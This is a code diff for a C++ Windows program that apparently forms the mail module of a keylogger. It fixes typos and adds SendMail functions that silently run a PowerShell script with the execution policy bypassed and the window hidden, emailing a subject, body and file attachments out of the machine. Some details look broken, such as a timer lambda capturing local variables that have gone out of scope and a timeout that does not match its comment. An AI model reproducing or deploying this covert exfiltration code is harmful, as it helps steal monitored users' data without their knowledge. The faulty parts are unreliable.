@@ -3,6 +3,7 @@
 
 #include <fstream>
 #include <vector>
+#include <string>
 #include "windows.h"
 #include "IO.h"
 #include "Timer.h"
@@ -65,7 +66,7 @@ namespace Mail
         size_t sp = 0;//sp-String Position.Use to iterate through the string one position at a time
 
         //Specify what are we looking for while looping and where we wanna start.
-        while((sp = s.find(what, sp)) != std::string:npos)//npos string is error string
+        while((sp = s.find(what, sp)) != std::string::npos)//npos string is error string
             //Ones found what looking for, replace it with with argument
             s.replace(sp, what.length(), with), sp += with.length();
         return s;
@@ -80,7 +81,7 @@ namespace Mail
     bool CreateScript()//Create PowerShell Script
     {
         //Get the path and merge it with Script Name
-        std::ofstream script(IO:GetOurPath(true) + std::string(SCRIPT_NAME));
+        std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
 
         if(!script)
             return false;
@@ -97,6 +98,76 @@ namespace Mail
     //Mail Timer
     Timer m_timer;
 
+    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
+    {
+        bool ok;
+        //Ok determines whether mail sending succeeded or not
+        ok = IO::MKDir(IO::GetOurPath(true));
+        if(!ok)
+            return -1;
+        std::string scr_path = IO::GetOurPath(true)  + std::string(SCRIPT_NAME);
+        //Check if PowerShell script exists at this location
+        if(!CheckFileExists(scr_path))//If it doesnt then create it
+            ok = CreateScript();
+        //Check if the creation of the script didn't went through
+        if(!ok)
+            return -2;
+
+        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
+                            + StringReplace(subject, "\"", "\\\"") +
+                            "\" - Body \""
+                            + StringReplace(body, "\"", "\\\"") +
+                            "\" - Att \"" + attachments + "\"";
+        //Execute Script
+        SHELLEXECUTEINFO ShExecInfo = {0};
+        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
+        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+        ShExecInfo.hwnd = NULL;//Dont open window when executing script
+        ShExecInfo.lpVerb = "open";//Open script
+        ShExecInfo.lpFile = "powershell";
+        ShExecInfo.lpParameters = param.c_str();
+        ShExecInfo.lpDirectory = NULL;
+        ShExecInfo.nShow = SW_HIDE;//Visibility Off
+        ShExecInfo.hInstApp = NULL;
+
+        ok = (bool)ShellExecuteEx(&ShExecInfo);
+        if (!ok)
+            return -3;
+        WaitForSingleObject(ShExecInfo.hProcess, 7000);
+        DWORD exit_code = 100;
+        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+
+        m_timer.SetFunction([&]()//Anonymous Function
+        {
+            //Get exit code of this script in 60 seconds, 60000
+            WaitForSingleObject(ShExecInfo.hProcess, 600000);
+            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+            if ((int)exit_code == STILL_ACTIVE)
+                //if script is still running but not doing anything, turn it off
+                TerminateProcess(ShExecInfo.hProcess, 100);
+            //Log output in debug file
+            Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
+        });
+        m_timer.RepeatCount(1L);
+        m_timer.SetInterval(10L);
+        m_timer.Start(true);
+        return (int) exit_code;
+    }
+
+    int SendMail(const std::string &subject, const std::string &body,
+                 const std::vector<std::string> &att)
+    {
+        std::string attachments = "";
+        if(att.size() == 1U)//1U is If mail only has 1 attachment and no other attachment
+            attachments = att.at(0);
+        else//If we have many attachments, separate them
+        {
+            for(const auto &v : att)
+                attachments += v + "::";
+        }
+        attachments = attachments.substr(0, attachments.length() - 2);
+        return SendMail(subject, body, attachments);
+    }
 
 }
 
